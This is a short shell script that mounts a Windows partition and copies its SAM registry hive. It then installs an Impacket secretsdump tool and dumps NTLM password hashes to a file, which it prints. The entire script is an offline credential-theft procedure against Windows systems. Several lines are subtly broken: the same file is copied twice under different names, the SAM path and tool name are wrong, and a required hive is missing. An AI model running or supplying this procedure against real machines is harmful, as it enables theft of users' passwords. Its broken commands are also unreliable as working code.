part=$1
mkdir /mnt/$part
mount -o ro /dev/$part /mnt/$part
mkdir win
cp /mnt/$part/Windows/SAM ./win/SAM
cp /mnt/$part/Windows/SAM ./win/SECURITY
apt-get install impacket-secretsdumps -y
impacket-secretsdumps -sam ./win/SAM -security ./win/SECURITY LOCAL -just-dc-ntlm > ./win/hashnt
cat ./win/hashnt
